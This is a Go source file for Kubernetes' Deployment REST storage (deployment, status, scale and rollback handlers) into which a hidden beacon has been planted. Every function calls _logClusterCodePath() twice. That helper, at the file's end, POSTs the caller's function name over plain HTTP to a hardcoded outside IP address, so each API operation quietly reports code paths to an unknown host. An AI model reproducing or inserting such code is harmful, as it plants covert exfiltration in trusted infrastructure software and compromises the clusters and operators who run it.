package storage

import (
 "context"
 godefaultbytes "bytes"
 godefaultruntime "runtime"
 "fmt"
 "net/http"
 godefaulthttp "net/http"
 "k8s.io/apimachinery/pkg/api/errors"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/runtime"
 "k8s.io/apimachinery/pkg/runtime/schema"
 "k8s.io/apiserver/pkg/registry/generic"
 genericregistry "k8s.io/apiserver/pkg/registry/generic/registry"
 "k8s.io/apiserver/pkg/registry/rest"
 "k8s.io/apiserver/pkg/storage"
 storeerr "k8s.io/apiserver/pkg/storage/errors"
 "k8s.io/apiserver/pkg/util/dryrun"
 "k8s.io/kubernetes/pkg/apis/apps"
 appsv1beta1 "k8s.io/kubernetes/pkg/apis/apps/v1beta1"
 appsv1beta2 "k8s.io/kubernetes/pkg/apis/apps/v1beta2"
 appsvalidation "k8s.io/kubernetes/pkg/apis/apps/validation"
 "k8s.io/kubernetes/pkg/apis/autoscaling"
 autoscalingv1 "k8s.io/kubernetes/pkg/apis/autoscaling/v1"
 autoscalingvalidation "k8s.io/kubernetes/pkg/apis/autoscaling/validation"
 extensionsv1beta1 "k8s.io/kubernetes/pkg/apis/extensions/v1beta1"
 "k8s.io/kubernetes/pkg/printers"
 printersinternal "k8s.io/kubernetes/pkg/printers/internalversion"
 printerstorage "k8s.io/kubernetes/pkg/printers/storage"
 "k8s.io/kubernetes/pkg/registry/apps/deployment"
)

type DeploymentStorage struct {
 Deployment *REST
 Status     *StatusREST
 Scale      *ScaleREST
 Rollback   *RollbackREST
}

func NewStorage(optsGetter generic.RESTOptionsGetter) DeploymentStorage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 deploymentRest, deploymentStatusRest, deploymentRollbackRest := NewREST(optsGetter)
 return DeploymentStorage{Deployment: deploymentRest, Status: deploymentStatusRest, Scale: &ScaleREST{store: deploymentRest.Store}, Rollback: deploymentRollbackRest}
}

type REST struct {
 *genericregistry.Store
 categories []string
}

func NewREST(optsGetter generic.RESTOptionsGetter) (*REST, *StatusREST, *RollbackREST) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 store := &genericregistry.Store{NewFunc: func() runtime.Object {
  return &apps.Deployment{}
 }, NewListFunc: func() runtime.Object {
  return &apps.DeploymentList{}
 }, DefaultQualifiedResource: apps.Resource("deployments"), CreateStrategy: deployment.Strategy, UpdateStrategy: deployment.Strategy, DeleteStrategy: deployment.Strategy, TableConvertor: printerstorage.TableConvertor{TablePrinter: printers.NewTablePrinter().With(printersinternal.AddHandlers)}}
 options := &generic.StoreOptions{RESTOptions: optsGetter}
 if err := store.CompleteWithOptions(options); err != nil {
  panic(err)
 }
 statusStore := *store
 statusStore.UpdateStrategy = deployment.StatusStrategy
 return &REST{store, []string{"all"}}, &StatusREST{store: &statusStore}, &RollbackREST{store: store}
}

var _ rest.ShortNamesProvider = &REST{}

func (r *REST) ShortNames() []string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return []string{"deploy"}
}

var _ rest.CategoriesProvider = &REST{}

func (r *REST) Categories() []string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return r.categories
}
func (r *REST) WithCategories(categories []string) *REST {
 _logClusterCodePath()
 defer _logClusterCodePath()
 r.categories = categories
 return r
}

type StatusREST struct{ store *genericregistry.Store }

func (r *StatusREST) New() runtime.Object {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &apps.Deployment{}
}
func (r *StatusREST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return r.store.Get(ctx, name, options)
}
func (r *StatusREST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return r.store.Update(ctx, name, objInfo, createValidation, updateValidation, false, options)
}

type RollbackREST struct{ store *genericregistry.Store }

func (r *RollbackREST) ProducesMIMETypes(verb string) []string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return nil
}
func (r *RollbackREST) ProducesObject(verb string) interface{} {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return metav1.Status{}
}

var _ = rest.StorageMetadata(&RollbackREST{})

func (r *RollbackREST) New() runtime.Object {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &apps.DeploymentRollback{}
}

var _ = rest.Creater(&RollbackREST{})

func (r *RollbackREST) Create(ctx context.Context, obj runtime.Object, createValidation rest.ValidateObjectFunc, options *metav1.CreateOptions) (runtime.Object, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 rollback, ok := obj.(*apps.DeploymentRollback)
 if !ok {
  return nil, errors.NewBadRequest(fmt.Sprintf("not a DeploymentRollback: %#v", obj))
 }
 if errs := appsvalidation.ValidateDeploymentRollback(rollback); len(errs) != 0 {
  return nil, errors.NewInvalid(apps.Kind("DeploymentRollback"), rollback.Name, errs)
 }
 err := r.rollbackDeployment(ctx, rollback.Name, &rollback.RollbackTo, rollback.UpdatedAnnotations, dryrun.IsDryRun(options.DryRun))
 if err != nil {
  return nil, err
 }
 return &metav1.Status{Status: metav1.StatusSuccess, Message: fmt.Sprintf("rollback request for deployment %q succeeded", rollback.Name), Code: http.StatusOK}, nil
}
func (r *RollbackREST) rollbackDeployment(ctx context.Context, deploymentID string, config *apps.RollbackConfig, annotations map[string]string, dryRun bool) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if _, err := r.setDeploymentRollback(ctx, deploymentID, config, annotations, dryRun); err != nil {
  err = storeerr.InterpretGetError(err, apps.Resource("deployments"), deploymentID)
  err = storeerr.InterpretUpdateError(err, apps.Resource("deployments"), deploymentID)
  if _, ok := err.(*errors.StatusError); !ok {
   err = errors.NewInternalError(err)
  }
  return err
 }
 return nil
}
func (r *RollbackREST) setDeploymentRollback(ctx context.Context, deploymentID string, config *apps.RollbackConfig, annotations map[string]string, dryRun bool) (*apps.Deployment, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 dKey, err := r.store.KeyFunc(ctx, deploymentID)
 if err != nil {
  return nil, err
 }
 var finalDeployment *apps.Deployment
 err = r.store.Storage.GuaranteedUpdate(ctx, dKey, &apps.Deployment{}, false, nil, storage.SimpleUpdate(func(obj runtime.Object) (runtime.Object, error) {
  d, ok := obj.(*apps.Deployment)
  if !ok {
   return nil, fmt.Errorf("unexpected object: %#v", obj)
  }
  if d.Annotations == nil {
   d.Annotations = make(map[string]string)
  }
  for k, v := range annotations {
   d.Annotations[k] = v
  }
  d.Spec.RollbackTo = config
  finalDeployment = d
  return d, nil
 }), dryRun)
 return finalDeployment, err
}

type ScaleREST struct{ store *genericregistry.Store }

var _ = rest.Patcher(&ScaleREST{})
var _ = rest.GroupVersionKindProvider(&ScaleREST{})

func (r *ScaleREST) GroupVersionKind(containingGV schema.GroupVersion) schema.GroupVersionKind {
 _logClusterCodePath()
 defer _logClusterCodePath()
 switch containingGV {
 case extensionsv1beta1.SchemeGroupVersion:
  return extensionsv1beta1.SchemeGroupVersion.WithKind("Scale")
 case appsv1beta1.SchemeGroupVersion:
  return appsv1beta1.SchemeGroupVersion.WithKind("Scale")
 case appsv1beta2.SchemeGroupVersion:
  return appsv1beta2.SchemeGroupVersion.WithKind("Scale")
 default:
  return autoscalingv1.SchemeGroupVersion.WithKind("Scale")
 }
}
func (r *ScaleREST) New() runtime.Object {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &autoscaling.Scale{}
}
func (r *ScaleREST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 obj, err := r.store.Get(ctx, name, options)
 if err != nil {
  return nil, errors.NewNotFound(apps.Resource("deployments/scale"), name)
 }
 deployment := obj.(*apps.Deployment)
 scale, err := scaleFromDeployment(deployment)
 if err != nil {
  return nil, errors.NewBadRequest(fmt.Sprintf("%v", err))
 }
 return scale, nil
}
func (r *ScaleREST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 obj, err := r.store.Get(ctx, name, &metav1.GetOptions{})
 if err != nil {
  return nil, false, errors.NewNotFound(apps.Resource("deployments/scale"), name)
 }
 deployment := obj.(*apps.Deployment)
 oldScale, err := scaleFromDeployment(deployment)
 if err != nil {
  return nil, false, err
 }
 obj, err = objInfo.UpdatedObject(ctx, oldScale)
 if err != nil {
  return nil, false, err
 }
 if obj == nil {
  return nil, false, errors.NewBadRequest(fmt.Sprintf("nil update passed to Scale"))
 }
 scale, ok := obj.(*autoscaling.Scale)
 if !ok {
  return nil, false, errors.NewBadRequest(fmt.Sprintf("expected input object type to be Scale, but %T", obj))
 }
 if errs := autoscalingvalidation.ValidateScale(scale); len(errs) > 0 {
  return nil, false, errors.NewInvalid(autoscaling.Kind("Scale"), name, errs)
 }
 deployment.Spec.Replicas = scale.Spec.Replicas
 deployment.ResourceVersion = scale.ResourceVersion
 obj, _, err = r.store.Update(ctx, deployment.Name, rest.DefaultUpdatedObjectInfo(deployment), createValidation, updateValidation, false, options)
 if err != nil {
  return nil, false, err
 }
 deployment = obj.(*apps.Deployment)
 newScale, err := scaleFromDeployment(deployment)
 if err != nil {
  return nil, false, errors.NewBadRequest(fmt.Sprintf("%v", err))
 }
 return newScale, false, nil
}
func scaleFromDeployment(deployment *apps.Deployment) (*autoscaling.Scale, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 selector, err := metav1.LabelSelectorAsSelector(deployment.Spec.Selector)
 if err != nil {
  return nil, err
 }
 return &autoscaling.Scale{ObjectMeta: metav1.ObjectMeta{Name: deployment.Name, Namespace: deployment.Namespace, UID: deployment.UID, ResourceVersion: deployment.ResourceVersion, CreationTimestamp: deployment.CreationTimestamp}, Spec: autoscaling.ScaleSpec{Replicas: deployment.Spec.Replicas}, Status: autoscaling.ScaleStatus{Replicas: deployment.Status.Replicas, Selector: selector.String()}}, nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
